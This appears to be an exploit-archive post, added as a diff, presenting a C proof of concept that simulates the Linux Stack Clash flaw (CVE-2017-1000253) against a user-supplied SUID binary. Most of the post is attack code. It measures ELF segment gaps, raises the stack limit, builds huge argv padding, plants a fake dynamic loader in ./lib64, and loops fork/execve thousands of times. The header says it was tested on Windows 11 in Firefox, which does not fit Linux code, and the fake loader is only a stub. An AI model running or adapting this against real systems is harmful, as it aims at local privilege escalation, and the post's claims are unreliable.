@@ -1,0 +1,178 @@
+=============================================================================================================================================
+| # Title     : Linux Stack Memory Stress & ELF Layout Manipulation PoC (Stack Clash Simulation)                                            |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 147.0.3 (64 bits)                                                            |
+| # Vendor    : System built‑in component                                                                                                   |
+=============================================================================================================================================
+
+[+] Summary    : This program is a research Proof‑of‑Concept (PoC) that simulates conditions similar to historical Stack Clash vulnerabilities such as CVE-2017-1000253.
+
+[+] What it does:
+
+Analyzes an ELF binary to extract RX and RW segment boundaries.
+
+Calculates the memory gap between segments.
+
+Raises the stack limit (RLIMIT_STACK) to a large value.
+
+Creates extremely large argv padding to force stack expansion during execve().
+
+Generates a fake dynamic loader file.
+
+Repeats fork() + execve() thousands of times to stress memory behavior.
+
+[+] POC : 
+
+#define _GNU_SOURCE
+#include <elf.h>
+#include <fcntl.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/resource.h>
+#include <sys/stat.h>
+#include <sys/time.h>
+#include <sys/wait.h>
+#include <unistd.h>
+#include <errno.h>
+#define PAGESZ ((size_t)4096)
+#define STACK_GUARD_GAP (1UL << 20)     
+#define DEFAULT_MIN_GAP (128UL << 20)   
+#define MAX_ARG_STRLEN ((size_t)128 << 10) 
+
+struct elf_info {
+    uintptr_t rx_end;
+    uintptr_t rw_start;
+    uintptr_t rw_end;
+    uintptr_t dynamic_start;
+};
+
+static void safe_read(int fd, void *buf, size_t size) {
+    size_t total = 0;
+    while (total < size) {
+        ssize_t n = read(fd, (char *)buf + total, size - total);
+        if (n <= 0) {
+            fprintf(stderr, "[-] Critical: Failed to read ELF headers.\n");
+            exit(__LINE__);
+        }
+        total += n;
+    }
+}
+
+static struct elf_info get_elf_info(const char *path) {
+    struct elf_info elf = {0};
+    int fd = open(path, O_RDONLY);
+    if (fd < 0) { perror("open"); exit(__LINE__); }
+
+    struct stat st;
+    if (fstat(fd, &st) || st.st_size < sizeof(Elf64_Ehdr)) exit(__LINE__);
+
+    uint8_t *buf = malloc(st.st_size);
+    if (!buf) exit(__LINE__);
+    
+    safe_read(fd, buf, st.st_size);
+    close(fd);
+
+    Elf64_Ehdr *ehdr = (Elf64_Ehdr *)buf;
+
+    if (memcmp(ehdr->e_ident, ELFMAG, SELFMAG) != 0) exit(__LINE__);
+    if (ehdr->e_ident[EI_CLASS] != ELFCLASS64) exit(__LINE__);
+    if (ehdr->e_shnum > 0) {
+        size_t max_sh = (st.st_size - ehdr->e_shoff) / sizeof(Elf64_Shdr);
+        if (ehdr->e_shnum <= max_sh) {
+            Elf64_Shdr *shdr = (Elf64_Shdr *)(buf + ehdr->e_shoff);
+            for (int i = 0; i < ehdr->e_shnum; i++) {
+                if (shdr[i].sh_type == SHT_DYNAMIC) elf.dynamic_start = shdr[i].sh_addr;
+            }
+        }
+    }
+
+    Elf64_Phdr *phdr = (Elf64_Phdr *)(buf + ehdr->e_phoff);
+    for (int i = 0; i < ehdr->e_phnum; i++) {
+        if (phdr[i].p_type != PT_LOAD) continue;
+        uintptr_t end = (phdr[i].p_vaddr + phdr[i].p_memsz + PAGESZ - 1) & ~(PAGESZ - 1);
+        
+        if (phdr[i].p_flags & PF_X) {
+            elf.rx_end = end;
+        } else if (phdr[i].p_flags & PF_W) {
+            elf.rw_start = phdr[i].p_vaddr & ~(PAGESZ - 1);
+            elf.rw_end = end;
+        }
+    }
+
+    free(buf);
+    if (!elf.rx_end || !elf.rw_start) exit(__LINE__);
+    return elf;
+}
+
+int main(int argc, char *argv[]) {
+    if (argc < 2) {
+        printf("Usage: %s <target_suid_binary>\n", argv[0]);
+        return 1;
+    }
+
+    char *binary_path = realpath(argv[1], NULL);
+    if (!binary_path) { perror("realpath"); exit(__LINE__); }
+
+    struct elf_info elf = get_elf_info(binary_path);
+
+    unsigned long min_gap = DEFAULT_MIN_GAP;
+    if (elf.rw_start > elf.rx_end) {
+        unsigned long actual_dist = elf.rw_start - elf.rx_end;
+        if (actual_dist > min_gap) min_gap = actual_dist + (STACK_GUARD_GAP * 2);
+    }
+
+    const struct rlimit rlim = { min_gap, min_gap };
+    if (setrlimit(RLIMIT_STACK, &rlim) != 0) { perror("setrlimit"); exit(__LINE__); }
+
+    size_t npads = (min_gap / MAX_ARG_STRLEN);
+    char **adv_argv = calloc(npads + 8, sizeof(char *));
+    char **adv_envp = calloc(16, sizeof(char *));
+    if (!adv_argv || !adv_envp) exit(__LINE__);
+
+    for (size_t i = 0; i < npads + 2; i++) {
+        adv_argv[i] = malloc(MAX_ARG_STRLEN);
+        if (adv_argv[i]) {
+            memset(adv_argv[i], 'A', MAX_ARG_STRLEN - 1);
+            adv_argv[i][MAX_ARG_STRLEN - 1] = '\0';
+        }
+    }
+    adv_argv[0] = binary_path;
+    adv_argv[1] = "--help";
+    adv_argv[npads + 4] = NULL;
+
+    if (mkdir("./lib64", 0755) == -1 && errno != EEXIST) exit(__LINE__);
+    
+    int fd = open("./lib64/ld-linux-x86-64.so.2", O_WRONLY | O_CREAT | O_TRUNC, 0755);
+    if (fd >= 0) {
+        char fake_elf[PAGESZ];
+        memset(fake_elf, 0, PAGESZ);
+        memcpy(fake_elf, "\x7f\x45\x4c\x46\x02\x01\x01\x00", 8); /* Valid ELF Header start */
+        if (write(fd, fake_elf, PAGESZ) != PAGESZ) exit(__LINE__);
+        close(fd);
+    }
+
+    printf("[*] Launching exploit on: %s\n", binary_path);
+    printf("[*] Target Gap: %lu MB\n", min_gap / 1024 / 1024);
+
+    for (size_t try = 1; try <= 20000; try++) {
+        pid_t pid = fork();
+        if (pid < 0) { usleep(100); continue; }
+        if (pid == 0) {
+
+            execve(binary_path, adv_argv, adv_envp);
+            _exit(1);
+        }
+        int status;
+        waitpid(pid, &status, 0);
+
+        if (WIFEXITED(status) && WEXITSTATUS(status) == 0) break;
+    }
+
+    free(binary_path);
+    return 0;
+}
+
+Greetings to :======================================================================
+jericho * Larry W. Cashdollar * r00t * Hussin-X * Malvuln (John Page aka hyp3rlinx)|
+====================================================================================
